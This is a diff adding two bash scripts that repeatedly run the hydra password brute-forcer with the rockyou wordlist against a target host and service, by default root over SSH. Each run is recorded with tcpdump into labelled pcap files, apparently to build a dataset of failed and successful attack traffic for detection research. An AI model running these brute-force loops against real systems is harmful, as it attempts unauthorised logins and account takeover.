@@ -1,0 +1,71 @@
+############################
+FOR THE FAILED ATTEMPTS:
+###########################
+#!/bin/bash
+# 
+# SAMPLE:
+# ./AutomatedTrafficCapture.sh 10.137.0.21 10.137.0.19 22 ssh 50 5 root Deb10
+# 
+# 
+
+
+SRC_IP=$1
+DST_IP=$2
+DST_PORT=$3
+HYDRA_PROT=$4
+ITERATIONS=$5
+LENGTH=$6
+UNAME=$7
+OS=$8
+
+for i in $(seq 1 $ITERATIONS)
+        do
+                echo "---------- start tcpdump #$i ------------"
+                sudo tcpdump -i eth0 host $SRC_IP and host $DST_IP -w Hydra_${HYDRA_PROT}_${OS}_${i}_$(date +"%T" | sed -e "s/:/-/g").pcap & ttempid=$!
+                echo "********** tcpdump PID $ttempid ********"
+                echo "---------  start hydra #$i -------------"
+                hydra -f -l $UNAME -P /usr/share/wordlists/rockyou.txt -u  -s $DST_PORT $DST_IP $HYDRA_PROT -I & htempid=$!
+                echo "********* hygra PID $htempid ***********"
+                sleep $LENGTH
+                hgid=$(ps xao pid,pgid,comm | grep ${htempid} | awk '{ print $2 }')
+                echo "****** HGID $hgid"
+                sudo pkill -TERM -P ${hgid}
+                sleep 5
+                sudo pkill -TERM -P ${ttempid}
+        done
+
+
+############################
+FOR THE SUCCESSFUL ATTEMPTS:
+###########################
+
+
+#!/bin/bash
+# 
+# SAMPLE:
+# ./AutomatedTrafficCapture.sh 10.137.0.21 10.137.0.19 22 ssh 50 5 root Deb10
+# 
+# 
+
+
+SRC_IP=$1
+DST_IP=$2
+DST_PORT=$3
+HYDRA_PROT=$4
+ITERATIONS=$5
+UNAME=$6
+OS=$7
+
+for i in $(seq 1 $ITERATIONS)
+        do
+                echo "---------- start tcpdump #$i ------------"
+                sudo tcpdump -i eth0 host $SRC_IP and host $DST_IP -w Hydra_${HYDRA_PROT}_${OS}_SUCCESS_${i}_$(date +"%T" | sed -e "s/:/-/g").pcap & tempid=$! 
+                echo "======= this is the tempid $tempid ======="
+                echo "---------  start hydra #$i -------------"
+                hydra -f -l $UNAME -P /usr/share/wordlists/rockyou.txt -u  -s $DST_PORT $DST_IP $HYDRA_PROT -I 
+#               sleep $LENGTH
+#               sudo pkill hydra
+                sleep 5
+                sudo pkill -TERM -P ${tempid}
+        done
+
